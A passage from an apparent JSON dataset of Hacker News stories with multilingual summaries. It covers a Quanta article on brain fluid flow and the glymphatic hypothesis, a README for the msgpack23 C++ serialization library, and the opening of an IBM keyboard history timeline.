Email\n\n                        Subscribe\n\n                        Recent newsletters\n\n                                    Gift Store\n\n                                        Shop Quanta gear\n\nNewsletter\n\n                    Get the latest news delivered to your inbox.\n\n                            Email\n\n                        Subscribe\n\n                        Recent newsletters\n\nQuanta Homepage\n\n                                        Physics\n\n                                        Mathematics\n\n                                        Biology\n\n                                        Computer Science\n\n                                        Topics\n\n                                        Archive\n\n        Saved articles\n\n                    Saved Articles\n                                            Create a reading list by clicking the Read Later icon next to the articles you wish to save.\n\n                            See all saved articles\n\n        Login\n\n                    Log out\n\n                    Change password\n\n                                Search\n\nHome\n\n                The Mysterious Flow of Fluid in the Brain\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\n                                                Share\n\n    Facebook\n\n                            Copied!\n\n    Copy link\n         (opens a new tab)\n\n    Email\n\n    Pocket\n\n    Reddit\n\n    Ycombinator\n\nphysiology\n    The Mysterious Flow of Fluid in the Brain\n\n        By\n\n                Veronique Greenwood\n\nMarch 26, 2025\n\n            A popular hypothesis for how the brain clears molecular waste, which may help explain why sleep feels refreshing, is a subject of debate.\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\nphysiology\n    The Mysterious Flow of Fluid in the Brain\n\n        By\n\n                Veronique Greenwood\n\nMarch 26, 2025\n\n            A popular hypothesis for how the brain clears molecular waste, which may help explain why sleep feels refreshing, is a subject of debate.\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\nNo one knows why cerebrospinal fluid circulates through and around our brains, or what directs its flow.\n\n    Chanelle Nibbelink forQuanta Magazine\n\nEncased in the skull, perched atop the spine, the brain has a carefully managed existence. It receives only certain nutrients, filtered through the blood-brain barrier; an elaborate system of protective membranes surrounds it. That privileged space contains a mystery. For more than a century, scientists have wondered: If it’s so hard for anything to get into the brain, how does waste get out?\nThe brain has one of the highest metabolisms of any organ in the body, and that process must yield by-products that need to be removed. In the rest of the body, blood vessels are shadowed by a system of lymphatic vessels. Molecules that have served their purpose in the blood move into these fluid-filled tubes and are swept away to the lymph nodes for processing. But blood vessels in the brain have no such outlet. Several hundred kilometers of them, all told, seem to thread their way through this dense, busily working tissue without a matching waste system.\nHowever, the brain’s blood vessels are surrounded by open, fluid-filled spaces. In recent decades, the cerebrospinal fluid, or CSF, in those spaces has drawn a great deal of interest. “Maybe the CSF can be a highway, in a way, for the flow or exchange of different things within the brain,” said Steven Proulx, who studies the CSF system at the University of Bern.\nA recent paper in Cell contains a new report about what is going on around the brain (opens a new tab) and in its hidden cavities. A team at the University of Rochester led by the neurologist Maiken Nedergaard (opens a new tab) asked whether the slow pumping of the brain’s blood vessels might be able to push the fluid around, among, and in some cases through cells, to potentially drive a system of drainage. In a mouse model, researchers injected a glowing dye into CSF, manipulated the blood vessel walls to trigger a pumping action, and saw the dye concentration increase in the brain soon after. They concluded that the movement of blood vessels might be enough to move CSF, and possibly the brain’s waste, over long distances.\nThe team took a further step in their interpretation. Because this kind of pumping — distinct from the familiar pulse from the heart — is regularly observed during sleep, they suggest that perhaps their observations can help explain why sleep feels refreshing. But it’s a hypothesis that not everyone agrees is well founded (opens a new tab). When it comes to ascribing purpose to the fluid moving through the brain, many researchers believe that the truth is still elusive.\nBrain Drain\nAt the center of the brain are flooded caverns, like great cisterns shrouded in darkness, called ventricles. Cerebrospinal fluid seeps from the ventricle walls and then moves. Under pressure, it emerges elsewhere within the skull, flows down the neck and enters the spine.\n\nThe neurologist Maiken Nedergaard’s “glymphatic hypothesis” proposes that cerebrospinal fluid helps drain waste from the brain during sleep. Her evidence is highly debated.\n\n    Adam Fenster, University of Rochester\n\nScientists have known for more than a century that, at the moment of death (opens a new tab), CSF flows from the spine into the brain. This suggests that the living brain somehow keeps the stuff moving, but no one knows exactly how or where it flows. Any arrows drawn on diagrams of the brain and skull to show its movement should not be taken as the complete truth.\n“Everyone accepts that there must be some kind of flow here,” said Christer Betsholtz (opens a new tab), a professor of vascular biology at the Karolinska Institute in Sweden. “About half a liter of CSF is produced in the ventricles every day, and it has to get out. People are still fighting about where the cerebrospinal fluid gets out.”\n\nAlso under discussion is whether it picks up waste on the way out of the brain and, crucially, how. There is good evidence that small molecules, at least, can diffuse through the spaces between cells, make their way to the CSF, and ride it out of the brain (opens a new tab). In fact, some researchers believe that the entire system works by way of passive diffusion.\nIn 2012, results from Nedergaard’s lab suggested a more active process. Nedergaard, along with the neurologist Jeffrey Iliff (opens a new tab), then a postdoc in her lab, and their colleagues, injected a tracer into cerebrospinal fluid (opens a new tab) and watched it quickly arrive elsewhere. How did it get from one place to another? They proposed that the spaces around blood vessels commune with even smaller spaces deep in the brain, between individual cells. They also suggested that CSF moves through brain cells called astrocytes into those spaces. There, the fluid might drop off some molecules and pick up others; it may then wend its way back out to the spaces around blood vessels, and thence move waste out of the brain. All of this would have to be driven by a flow of uncertain mechanism.\nIt was a striking idea. Nedergaard, who is the senior author of the new paper, and colleagues soon made it more striking by linking it to another mystery: why sleep seems to be beneficial. In a 2013 paper, her team wrote that there was more movement of cerebrospinal fluid (opens a new tab) in sleeping and anesthetized mice than in waking ones — and that perhaps during sleep CSF sweeps waste out of the brain. Maybe this “brainwashing,” as headlines described it, could provide one reason why sleep is necessary (opens a new tab), and explain how much better we feel after a good night of it.\n\nMark Belan/Quanta Magazine\n\n“I’m of the strong belief that the restorative part of sleep is not memory consolidation,” Nedergaard said. “Maybe it is partly. But it is really the housekeeping function of sleep that is important.”\nIn the years since those initial studies, a large number of papers (opens a new tab) referencing this brain-drainage theory, called the glymphatic hypothesis, have been published. It’s a catchy idea, but parts of the story raise red flags (opens a new tab) to some researchers who study the brain’s vasculature.\nAlan Verkman (opens a new tab), a professor emeritus at the University of California, San Francisco who studies fluid flow in the body, has argued that some aspects of the theory are physically implausible — for instance, the channels said to let the fluid in cannot actually play the role demanded of them. According to Betsholtz, there is no evidence that fluid is moving into the spaces around blood vessels that leave the brain.\nBut many other researchers appear to have accepted the glymphatic hypothesis. That’s because it fills a hole in our understanding of the brain, said Donald McDonald (opens a new tab), who studies blood and lymph vessels at the UCSF School of Medicine. Personally, he doesn’t feel that the theory holds water, but he acknowledges its popularity. It fits comfortably in the space where there is a mystery.\nEbb and Flow\n\n            Any arrows drawn on diagrams of the brain and skull to show the fluid’s movement should not be taken as the complete truth.\n\nImagine a sealed bottle of water. To study that fluid in its natural state, you have to cut a hole in the bottle. This is the difficulty that scientists studying CSF flow have to deal with. “If you are studying a fluid and you put a hole in the system, you really change it,” said Laura Lewis (opens a new tab), a professor of neuroscience at the Massachusetts Institute of Technology. “Fluid dynamics are really easily disturbed by invasive procedures.” Further, so many behaviors that living animals perform, such as breathing and having a heartbeat, directly affect the fluid.\nBuilding a case for a new hypothesis in this area, then, is tricky. In the Nedergaard group’s recent Cell paper, the team wanted to explore an intriguing connection (opens a new tab) that would not only explain how CSF could be pumped between brain cells, but also link that process to sleep.\nFor the study, mice underwent surgery to have sensors, wires and tubes implanted within the brain — one way to study the bottle of water. The researchers’ goal was to inject tracer dye into CSF at one point in the brain and then track its oscillations and dynamics while the mice slept.\nThe data showed that, while mice were in their non–rapid eye movement (NREM) phase of sleep, the concentration of tracer moved rhythmically. From a sensor perched above the brain surface, the researchers saw a pattern of increases and decreases, according to first author Natalie Haugland. “It had this wave pattern.”\nWhat could be driving this rhythmic flow? The researchers thought of the neurotransmitter norepinephrine, which causes blood vessels to constrict. “Norepinephrine is very well known for controlling blood flow,” Nedergaard said. It’s possible, they thought, that vessels constricting and relaxing could put enough force on the surrounding cerebrospinal fluid to push it through the brain’s tissues.\n\nResearch led by Natalie Haugland suggests that pulses of norepinephrine help pump cerebrospinal fluid through the brain during non-REM sleep.\n\n    Björn Sigurdsson\n\nWhat’s more, during NREM sleep norepinephrine levels change rhythmically. This neurotransmitter could help tie together their hypotheses — the physical movement of CSF through brain tissues and the “brainwashing” occurring during sleep.\nThe team engineered mice in which they could switch the production of the neurotransmitter on and off. When norepinephrine levels went up, the volume of CSF in the brain went up, they saw, suggesting that it was somehow altering the fluid’s flow.\n\n            All of this would have to be driven by a flow of uncertain mechanism.\n\nThen, to test whether the pumping of blood vessels could move CSF, the team engineered mice with blood vessel walls they could manipulate directly. Instead of pumping the vessels slowly, as happens naturally, they moved the walls quickly — once every 10 seconds rather than once every 50. “When we did this, we increased CSF flow on one side of the brain” in a very small area where they were pumping, Haugland said. “It was very local. … Everywhere else in the brain it was the same.”\nFor Nedergaard, Haugland and their collaborators, the findings tie together norepinephrine, the physical movement of blood vessels, and the flow of CSF in the brain. Nedergaard also asserts that the results are consistent with her group’s earlier finding that there is more brain drainage during sleep than during wakefulness.\n“We have been searching for why the glymphatic [system] primarily works when we sleep for a long time,” Nedergaard said. “The paper is really about: Now we’ve found the motor or the driver of how we wash the brain when we sleep.”\nHowever, to critics of the theory, there are still too many open spaces.\nUnder Pressure\n\nMcDonald, of the UCSF School of Medicine, pointed out that the work is complex and requires many intricate methods. However, he’s concerned that Nedergaard is working backward: seeking an explanation for her hypothesis rather than trying to find out how the system actually works. “In this paper, it’s unclear what is interpretation and what is data,” he said. “Very early on, their interpretation gets substituted for what actually are the data.” He pointed to schematics showing flow dynamics that he doesn’t see supported, for instance.\nProulx questioned whether the tracer dye moved via an active force at all. The molecule is so small that it could be traveling by diffusion, he said. He imagines an experiment, using techniques Nedergaard’s lab has used before, where a large molecule is infused into the CSF. If the rhythmic releases of norepinephrine correlate with the arrival of a larger tracer at a sensor on the brain’s surface, that would be a fascinating finding. “That’s what I would have liked to have seen,” he said. To his eye, it would make a clearer connection between fluid flow and norepinephrine than the lab’s work has shown thus far.\nThe critiques of Nedergaard’s work come on strong in part because this idea is currently the most prominent hypothesis of CSF flow in the brain. That may change if other researchers can introduce other ideas that can be tested. Another wrinkle is that not everyone means the same thing when they talk about the glymphatic system. “Some people use ‘glymphatics’ to mean ‘waste transport system of the brain.’ Other people use it to mean a really specific mechanistic model,” Lewis said. “It’s clear that the brain has and needs a waste clearance system. … It’s really interesting to explore what that is and how that works.”\n\n                Related:\n\n                                    How the Brain Protects Itself From Blood-Borne Threats\n\n                                    Sleep Evolved Before Brains. Hydras Are Living Proof.\n\n                                    Why Do We Die Without Sleep?\n\nHaugland, now a postdoc at the University of Oxford, is aware of the controversy about the glymphatic hypothesis. “There is critique of it. I’m also not sure that we understand it in the right way,” she said. “The more people who are actually working on finding out how it works, no matter what their hypothesis is — all that will help drive the field forward and give us more knowledge.\n“The results are what they are. They show something about the biology,” she continued. “We are trying to ask a lot of questions and we’re not, maybe, all the time very good at it because we don’t know how it works — the big picture.”\n“Nobody has the truth,” Proulx said, about what the brain is doing up there, in our skulls, to rid itself of its waste. “Some people think they know. But I think we don’t know.”\n\nBy Veronique Greenwood\n                Contributing Writer\n\n                March 26, 2025\n\n                    View PDF/Print Mode\n\n                            biology\n\n                            brains\n\n                            explainers\n\n                            metabolism\n\n                            neuroscience\n\n                            physiology\n\n                            sleep\n\n                    All topics\n\n     (opens a new tab)\n\nShare this article\n\n    Facebook\n\n                            Copied!\n\n    Copy link\n         (opens a new tab)\n\n    Email\n\n    Pocket\n\n    Reddit\n\n    Ycombinator\n\n                    Newsletter\n\n                    Get Quanta Magazine delivered to your inbox\n\n                    Subscribe now\n\n                    Recent newsletters\n\n             (opens a new tab)\n\nThe Quanta Newsletter\n\n                    Get highlights of the most important news delivered to your email inbox\n\n                            Email\n\n                        Subscribe\n\n                        Recent newsletters\n                                             (opens a new tab)\n\nAlso in Biology\n\n                    How Metabolism Can Shape Cells’ Destinies\n\n                developmental biology\n\n                    How Metabolism Can Shape Cells’ Destinies\n\n        By\n\n                Viviane Callier\n\n            March 21, 2025\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\n                    How Did Multicellular Life Evolve?\n\n                The Joy of Why\n\n                    How Did Multicellular Life Evolve?\n\n        By\n\n                    Janna Levin\n\n                 +1 authors\n\n                        Steven Strogatz\n\n            March 20, 2025\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\n                    A New, Chemical View of Ecosystems\n\n                ecology\n\n                    A New, Chemical View of Ecosystems\n\n        By\n\n                Molly Herring\n\n            March 5, 2025\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\nComment on this article\n\n                    Quanta Magazine moderates comments tofacilitate an informed, substantive, civil conversation. Abusive, profane, self-promotional, misleading, incoherent or off-topic comments will be rejected. Moderators are staffed during regular business hours (New York time) and can only accept comments written in English.\n\n        Show comments\n\nNext article\n                Three Hundred Years Later, a Tool from Isaac Newton Gets an Update\n\nQuanta Homepage\n\n    Facebook\n\n        Youtube\n\n        Instagram\n\n                                        About Quanta\n\n                                        Archive\n\n                                        Contact Us\n\n                                        Terms & Conditions\n\n                                        Privacy Policy\n\n                        All Rights Reserved © 2025\n\n                    An editorially independent publication supported by the Simons Foundation.\n\n                        Simons Foundation\n\nQuanta Homepage\n\n    Facebook\n\n        Youtube\n\n        Instagram\n\nAbout Quanta\n\n                                        Archive\n\n                                        Contact Us\n\n                                        Terms & Conditions\n\n                                        Privacy Policy\n\nAll Rights Reserved © 2025\n\n                    An editorially independent publication supported by the Simons Foundation.\n\n                        Simons Foundation\n\nClose\n\n    Log in to Quanta\n\n            Use your social network\n\n                        Facebook                        Connect with Facebook\n\n                                                Connect with Google\n\n            or\n\n                    email\n\n                    password\n\n                    Remember me\n\n                        Forgot your password ?\n\n    Don't have an account yet?\n         Sign up\n\nClose\n\n        Forgot your password?\n        We’ll email you instructions to reset your password\n\n                email\n\nClose\n\n        Change your password\n        Enter your new password\n\n                Password\n\n                Retype new password\n\nClose\n\n        Sign Up\n\n                    First Name\n\n                    Last Name\n\n                    Email\n\n                    Password\n\n                    Retype Password\n\n            Creating an account means you accept Quanta Magazine's\n\n            Terms & Conditions and Privacy Policy",
    "summary": {
      "en": "The article discusses the mysterious flow of cerebrospinal fluid (CSF) in the brain and its potential role in waste removal, particularly during sleep. Researchers have debated how the brain clears waste since it lacks a traditional drainage system like the rest of the body. \n\nRecent studies suggest that the pumping action of blood vessels may help move CSF, which could assist in eliminating waste. A prominent theory called the \"glymphatic hypothesis\" proposes that this process is most effective during sleep, making sleep feel refreshing. However, this hypothesis is contested by some scientists who question the mechanisms proposed.\n\nA new study from the University of Rochester used mice to explore how CSF flows during sleep and implicated a neurotransmitter, norepinephrine, in driving this fluid movement. While some researchers support the glymphatic hypothesis, others express skepticism and emphasize the need for further investigation to fully understand how waste is cleared from the brain.\n\nOverall, the flow of CSF and its connection to sleep and brain health remains a complex and actively researched topic.",
      "ko": "이 기사는 뇌에서의 뇌척수액(CSF)의 신비로운 흐름과 특히 수면 중에 노폐물 제거에 미치는 잠재적 역할에 대해 다룹니다. 연구자들은 뇌가 전통적인 배수 시스템이 없기 때문에 어떻게 노폐물을 제거하는지에 대해 논의해왔습니다.\n\n최근 연구들은 혈관의 펌핑 작용이 CSF의 흐름을 도와 노폐물 제거에 기여할 수 있다는 점을 제시합니다. \"글림프틱 가설\"이라는 주요 이론은 이 과정이 수면 중에 가장 효과적이라고 주장하며, 이로 인해 수면이 상쾌하게 느껴진다고 설명합니다. 그러나 이 가설에 대해 일부 과학자들은 제안된 메커니즘에 의문을 제기하며 반대 의견을 내고 있습니다.\n\n로체스터 대학교의 새로운 연구는 쥐를 사용하여 수면 중 CSF의 흐름을 조사하였고, 이 액체의 움직임에 영향을 미치는 신경전달물질인 노르에피네프린을 확인했습니다. 일부 연구자들은 글림프틱 가설을 지지하지만, 다른 연구자들은 회의적인 입장을 보이며 뇌에서 노폐물이 어떻게 제거되는지를 완전히 이해하기 위해 추가 연구가 필요하다고 강조합니다.\n\n전반적으로 CSF의 흐름과 수면, 뇌 건강 간의 관계는 여전히 복잡하고 활발히 연구되고 있는 주제입니다.",
      "ja": "この記事では、脳内の脊髄液（CSF）の神秘的な流れと、特に睡眠中の廃棄物除去における役割について考察しています。脳には体の他の部分のような伝統的な排水システムがないため、研究者たちは脳がどのように廃棄物を排除するのかについて議論を重ねてきました。\n\n最近の研究では、血管のポンプ作用がCSFの移動を助け、廃棄物の除去に寄与する可能性が示唆されています。「グリンファティック仮説」と呼ばれる有力な理論は、このプロセスが睡眠中に最も効果的であるため、睡眠がリフレッシュ感をもたらすと提唱しています。しかし、この仮説には異論を唱える科学者もおり、提案されたメカニズムに疑問を持っています。\n\nロチェスター大学の新しい研究では、マウスを使って睡眠中のCSFの流れを調査し、神経伝達物質であるノルエピネフリンがこの液体の動きを促進する役割を果たしていることが示されました。一部の研究者はグリンファティック仮説を支持していますが、他の研究者は懐疑的であり、脳からの廃棄物除去の仕組みを完全に理解するためにはさらなる調査が必要だと強調しています。\n\n全体として、CSFの流れと睡眠、脳の健康との関連は、複雑で活発に研究されているテーマです。"
    }
  },
  {
    "id": "fa0111a566ae5eea",
    "title": {
      "en": "Msgpack23 – A modern, header-only C++ library for MessagePack (de)serialization",
      "ko": "메시지팩23: C++로 간편하게!",
      "ja": "Msgpack23: C++で簡単にデータ処理"
    },
    "type": "story",
    "url": "https://github.com/rwindegger/msgpack23",
    "score": 13,
    "by": "gjvc",
    "time": 1743293747,
    "content": "msgpack23\nA modern, header-only C++ library for MessagePack serialization and deserialization.\nOverview\nmsgpack23 is a lightweight library that provides a straightforward approach to serializing and deserializing C++ data structures into the MessagePack format. It is written in modern C++ (targeting C++20 and beyond) and leverages templates and type traits to provide a flexible, zero-dependency solution for packing and unpacking various data types.\nKey Features\n\nHeader-only: Simply include the header and start using it—no additional build steps or dependencies.\nModern C++: Uses C++ features like concepts to handle containers, maps, enums, time points, and user-defined types.\nExtensible: Allows you to define custom types by implementing pack and unpack member functions, automatically integrating them into the serialization pipeline.\nCollection and Map Support: Automatically detects and serializes STL containers (e.g., std::vector, std::map) without extra work.\nTime Point Support: Native support for serializing std::chrono::time_point objects.\nVariety of Primitive Types: Integers (signed/unsigned), booleans, floating-point, std::string, byte arrays, and nullptr are all supported out-of-the-box.\nEndian-Aware: Properly handles endianness using std::endian and std::byteswap to ensure portability.\n\nGetting Started\n\nClone the Repository\ngit clone https://github.com/rwindegger/msgpack23.git\n\nInclude the Header\nSince this is a header-only library, just include the main header in your project:\n#include \"msgpack23.hpp\"\n\nPack and Unpack\n#include <iostream>\n#include <map>\n#include \"msgpack23.hpp\"\n\nint main() {\n    // Create a map of some data\n    std::map<std::string, int> original {{\"apple\", 1}, {\"banana\", 2}};\n\n    // 1) Pack into a vector of std::byte\n    msgpack23::Packer packer;\n    auto packedData = packer(original);\n\n    // 2) Unpack back into a map\n    std::map<std::string, int> unpacked;\n    msgpack23::Unpacker unpacker(packedData);\n    unpacker(unpacked);\n\n    // Verify the result\n    for (auto const& [key, value] : unpacked) {\n        std::cout << key << \": \" << value << \"\\n\";\n    }\n    return 0;\n}\n\nCustom Types\nTo serialize your own types, define a pack and unpack function. The pack should accept a T & and the unpack should accept a T &.\nstruct MyData {\n   int64_t my_integer;\n   std::string my_string;\n\n   template<typename T>\n   std::vector<std::byte> pack(T &packer) const {\n      return packer(my_integer, my_string);\n   }\n\n   template<typename T>\n   void unpack(T &unpacker) {\n      unpacker(my_integer, my_string);\n   }\n};\n\nNow you can use MyData with msgpack23 just like any built-in type:\nMyData const my_data {42, \"Hello\" };\nauto const data = msgpack23::pack(my_data);\nauto obj = msgpack23::unpack<MyData>(data);\n\nWhy msgpack23?\n\nSimplicity: A single header with clearly structured pack/unpack logic.\nPerformance: Minimal overhead by using direct memory operations and compile-time type deductions.\nFlexibility: From primitive types and STL containers to custom structures, everything can be serialized with minimal boilerplate.\n\nContributing\nContributions, bug reports, and feature requests are welcome! Feel free to open an issue or submit a pull request.\n\nFork it!\nCreate your feature branch: git checkout -b feature/my-new-feature\nCommit your changes: git commit -am 'Add some feature'\nPush to the branch: git push origin feature/my-new-feature\nSubmit a pull request\n\nLicense\nThis project is licensed under the MIT License.\n\nHappy packing (and unpacking)! If you have any questions or feedback, please open an issue or start a discussion.",
    "summary": {
      "en": "**Summary of msgpack23**\n\nmsgpack23 is a modern, header-only C++ library designed for easy serialization and deserialization of C++ data into the MessagePack format. Here are the key points:\n\n- **Lightweight and Easy to Use**: Simply include a single header file and you can start using the library with no extra dependencies.\n\n- **Modern C++ Features**: Supports C++20 features, making it flexible for various data types including containers, maps, enums, and user-defined types.\n\n- **Custom Type Support**: You can create your own types by implementing packing and unpacking functions, which integrate seamlessly into the library.\n\n- **Built-in Support for Collections**: Automatically serializes standard containers like `std::vector` and `std::map`.\n\n- **Time Point Serialization**: Handles `std::chrono::time_point` objects natively.\n\n- **Variety of Data Types**: Supports multiple primitive types, including integers, booleans, floating-point numbers, strings, and byte arrays.\n\n- **Portability**: Manages endianness to ensure compatibility across different systems.\n\n**Getting Started**:\n1. Clone the repository using Git.\n2. Include the main header in your project.\n3. Use the provided examples to pack and unpack data.\n\n**Custom Types Example**:\nTo serialize your custom structures, define pack and unpack functions within the structure.\n\n**Why Choose msgpack23?**:\n- **Simplicity**: Easy to understand and use with a single header.\n- **Performance**: Efficient memory operations and compile-time type handling.\n- **Flexibility**: Can handle a wide range of data types with little extra code.\n\n**Contribution**: Contributions are encouraged! You can report bugs or submit new features through GitHub.\n\n**License**: The library is licensed under the MIT License. \n\nOverall, msgpack23 offers a simple and efficient way to work with MessagePack serialization in C++.",
      "ko": "msgpack23는 C++ 데이터를 MessagePack 형식으로 쉽게 직렬화하고 역직렬화할 수 있도록 설계된 현대적인 헤더 전용 C++ 라이브러리입니다. 이 라이브러리는 가볍고 사용하기 쉬우며, 추가적인 의존성 없이 단일 헤더 파일만 포함하면 사용할 수 있습니다.\n\nmsgpack23는 C++20 기능을 지원하여 다양한 데이터 유형, 즉 컨테이너, 맵, 열거형, 사용자 정의 유형 등을 유연하게 처리할 수 있습니다. 사용자는 패킹과 언패킹 함수를 구현하여 자신만의 유형을 만들 수 있으며, 이는 라이브러리에 원활하게 통합됩니다. 또한, 표준 컨테이너인 `std::vector`와 `std::map`을 자동으로 직렬화하는 기능도 포함되어 있습니다. \n\n시간 관련 객체인 `std::chrono::time_point`도 기본적으로 처리할 수 있으며, 정수, 불리언, 부동 소수점 숫자, 문자열, 바이트 배열 등 다양한 원시 데이터 유형을 지원합니다. 이 라이브러리는 엔디안 문제를 관리하여 서로 다른 시스템 간의 호환성을 보장합니다.\n\n시작하려면 Git을 사용해 저장소를 복제하고, 프로젝트에 주요 헤더를 포함한 후 제공된 예제를 사용하여 데이터를 패킹하고 언패킹하면 됩니다. 사용자 정의 구조체를 직렬화하려면 구조체 내에 패킹 및 언패킹 함수를 정의하면 됩니다.\n\nmsgpack23를 선택해야 하는 이유는 간단함, 성능, 유연성입니다. 단일 헤더로 쉽게 이해하고 사용할 수 있으며, 메모리 작업이 효율적이고 컴파일 시간에 유형을 처리할 수 있습니다. 또한, 다양한 데이터 유형을 적은 코드로 처리할 수 있는 유연성을 제공합니다.\n\n기여도 환영합니다! 버그를 보고하거나 새로운 기능을 GitHub를 통해 제출할 수 있습니다. 이 라이브러리는 MIT 라이선스 하에 배포됩니다. 전반적으로 msgpack23은 C++에서 MessagePack 직렬화를 간단하고 효율적으로 처리할 수 있는 방법을 제공합니다.",
      "ja": "msgpack23は、C++データをMessagePack形式に簡単にシリアライズおよびデシリアライズするために設計された、モダンなヘッダーオンリーのC++ライブラリです。このライブラリの主な特徴は以下の通りです。\n\n軽量で使いやすく、単一のヘッダーファイルをインクルードするだけで、追加の依存関係なしにライブラリを利用できます。また、C++20の機能をサポートしており、コンテナ、マップ、列挙型、ユーザー定義型など、さまざまなデータ型に柔軟に対応しています。独自の型を作成することも可能で、パッキングとアンパッキングの関数を実装することで、ライブラリにシームレスに統合できます。\n\n標準コンテナである`std::vector`や`std::map`の自動シリアライズをサポートしており、`std::chrono::time_point`オブジェクトもネイティブに扱えます。整数、ブール値、浮動小数点数、文字列、バイト配列など、さまざまな基本データ型にも対応しています。エンディアンネスを管理することで、異なるシステム間での互換性も確保されています。\n\n使い始めるには、まずGitを使ってリポジトリをクローンし、プロジェクトにメインヘッダーを含めます。提供されている例を参考にして、データのパックとアンパックを行うことができます。カスタム構造体をシリアライズする場合は、構造体内にパックとアンパックの関数を定義します。\n\nmsgpack23を選ぶ理由は、シンプルさ、パフォーマンス、柔軟性です。単一のヘッダーで理解しやすく、効率的なメモリ操作とコンパイル時の型処理を提供します。また、少ない追加コードで幅広いデータ型を扱うことができます。\n\n貢献も歓迎されており、バグの報告や新機能の提案はGitHubを通じて行えます。このライブラリはMITライセンスの下で提供されています。全体として、msgpack23はC++でMessagePackシリアライズを扱うためのシンプルで効率的な方法を提供します。"
    }
  },
  {
    "id": "60401c8ca984b57b",
    "title": {
      "en": "A timeline of IBM keyboard history",
      "ko": "IBM 키보드 연대기",
      "ja": "IBMキーボードの歴史"
    },
    "type": "story",
    "url": "https://sharktastica.co.uk/wip/timeline",
    "score": 4,
    "by": "tart-lemonade",
    "time": 1743297324,
    "content": "▲A timeline of IBM keyboard history<div class=\"notice block\" id=\"noscript\"><span data-nosnippet=\"true\"><p><strong>JavaScript disabled or not supported</strong></p><p>It appears you have prevented JavaScript from running in your web browser or are using a web browser that does not support JavaScript. Admiral Shark's Keyboards presently requires JavaScript for quality-of-life features like switching between light/dark mode, navigating via title or image and copying search query links, and is necessary for the keyboard matrix simulators, keyboard property modals, interactable slideshows and image size optimisation. Please consider enabling JavaScript or using a web browser that supports it for a fully-featured and correctly working experience. If you have suggestions for reducing JavaScript dependency, feel free to let me know.</p></span></div>This is a preview of upcoming Admiral Shark's Keyboards content. This page is considered work-in-progress and should be treated as such.The IBM and family keyboard timeline is an illustrated overview of some of the most important events affecting IBM, Lexmark, Unicomp, Lenovo and Toshiba Global Commerce Solutions keyboards. This includes notable keyboard releases and withdrawals, corporate history like company founding, divestures and change in OEMs, and patents. Due to their relationship and impact on the keyboards around them, host devices such as personal computers, terminals, consoles and typewriters also appear throughout the timeline. 111 events have been recorded for the \"show all\" versions of the timeline.Show all (default)Show all (quick read)Show all (tabular)Show keyboards & hosts onlyShow companies & factories onlyShow patents only1890s1900s1910s1920s1930s1940s1950s1960s1970s1980s1990s2000s2010s2020sSources1896Herman Hollerith, a pioneer of punched card technology, founds the Tabulating Machine Company to market his inventions. Their equipment quickly gained ground in being uses for censuses of many companies, including the 1900 U.S. census.17thMay1901[ASK]Herman Hollerith patents the first keypunch (apparatus for perforating record-cards). This patent was implemented as the Hollerith 001 Mechanical Card Punch, which upon IBM's founding, became the IBM 001 Mechanical Card Punch and their first product.16thJune1911Computing-Tabulating-Recording Company (CTR) is founded by Charles R. Flint upon consolidating Herman Hollerith's The Tabulating Machine Company with Bundy Manufacturing Company, International Time Recording Company and the Computing Scale Company of America. CTR specialises in recording-keeping and measuring systems.14thFebruary1924The Computing-Tabulating-Recording Company is renamed the International Business Machines (IBM) Corporation under the presidency of Thomas J. Watson Sr.1933IBM acquires Electromatic Typewriters, Inc. to gain a head start with their typewriter ambitions, gaining Electromatic's patents, production facilities and tooling. IBM will invest $1 million in redesigning their product and improve support infrastructure for them.1935[1]IBM introduces its first family of electric typewriters. IBM invested heavily in the technology acquired from Electromatic, introducing the IBM Model 01 Electric Typewriter (pictured) from it. 01 would be joined by 02 through 10 within a decade's time.1948[2]The IBM Model A electric typewriter family is introduced.July1949[3]IBM introduces the 024 Card Punch and 026 Printing Card Punch, both BCDIC electric keypunches with a choice of a 21-key numeric keyboard or a 45-key combination keyboard (pictured). These keyboards are technically discrete and electrically separable, so they are also considered to be IBM's first generation of keyboards under the modern sense of what a keyboard is. They use a contact-bail system for keystroke sensing called a Keyboard Permutation Unit.1953IBM Canada opens the 844 Don Mills Road, Toronto, Ontario plant (plant 91). This plant would go on to play a minor role in Model M production and assembly, as IBM 4680 POS Alphanumeric Keyboards have been observed with its plant code in their serial/ID numbers, implying a \"location of control\" or \"location of manufacture\" relationship. As such keyboards' complete sub-assemblies were made by IBM Netherlands' Amsterdam plant (plant 58), it's likely the Don Mills plant only produced their cover sets and electronics and completed their final assembly.1954[4]The IBM Model B electric typewriter family is introduced.1954IBM United Kingdom opens the Greenock, Scotland plant (plant 55). Greenock became a major hub for manufacturing keyboards, personal computers, printers, terminals and typewriters destined to be sold in Europe, Middle East, and Africa (EMEA). It would go on to produce Model B, Model F and Model M keyboards and IBM ThinkPad notebook computers.1956IBM United States opens the Lexington, Kentucky plant (plant 11). This plant became associated with the IBM Information Products Division and was a known major producer of IBM typewriters and keyboards for the North American market.2ndSeptember1958The IBM 7150 Console Typewriter & Operating Keyboard (pictured) and 7900 Inquiry Station Typewriter Keyboard are introduced. They are the earliest known forms of IBM printer-keyboards, which are considered to be IBM's second generation of keyboards.1959[5]The IBM Model C electric typewriter family is introduced.1960IBM Netherlands opens its second Amsterdam, North Holland, the Netherlands plant (plant 58). This plant served a major manufacturer of IBM Office Products Division products such as electric typewriters, producing two million of such by 1980. In the '80s, the plant diversified to produce electronic typewriters and keyboards including in the Model F and Model M families.1967[6]The IBM Model D electric typewriter family is introduced. This is IBM's last non-Selectric typewriter.30thJuly1969IBM introduces its first named keyswitch design - the IBM elastic diaphragm - with the IBM 5475 Data Entry Keyboard. Elastic diaphragm encoded keyboards become IBM's third generation of keyboards.6thMay1971[7]The IBM 3270 Information Display System debuts as a family of coaxial cabled terminals originally intended for IBM System/360 or System/370 mainframe computers. At launch, the 3270 series included the IBM 3275 and 3277 Display Stations. The first keyboards of the 3270 family were the Micro Switch SW-based 66-key (pictured) and 78-key IBM 3275 and 3277 Display Station Type A Keyboards. These \"Type A\" keyboards would be replaced with Model B-based \"Type B\" keyboards within 2 years of launch.21stMay1971Richard Hunter Harris invents and patents the buckling spring (catastrophically buckling compression column switch and actuator). This keyswitch actuator is comprised of a metal coil spring that characteristically buckles into a kink instead of compressing in a straight column, which pivots something that can be registered by some sort of sensor. 